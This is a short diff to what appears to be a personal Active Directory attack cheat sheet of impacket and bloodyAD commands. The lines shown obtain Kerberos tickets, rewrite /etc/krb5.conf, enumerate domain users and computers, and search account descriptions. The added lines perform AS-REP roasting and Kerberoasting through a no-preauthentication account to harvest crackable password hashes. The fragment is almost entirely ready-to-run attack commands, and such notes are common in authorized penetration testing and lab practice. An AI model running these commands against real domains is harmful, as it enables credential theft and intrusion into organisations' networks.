@@ -184,6 +184,8 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; kcme
 kdc=$(klist | grep 'HTTP/' | awk '{print $5}' | cut -d '/' -f2 | cut -d '@' -f1); domain=$(echo $kdc | cut -d '.' -f2-3); echo -e "[libdefaults]\n default_realm = ANY.LOCAL\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n ANY.LOCAL = {\n  kdc = $kdc\n  admin_server = $kdc\n }\n\n[domain_realm]\n .$domain = ANY.LOCAL\n $domain = ANY.LOCAL" | sudo tee /etc/krb5.conf
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee computers
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
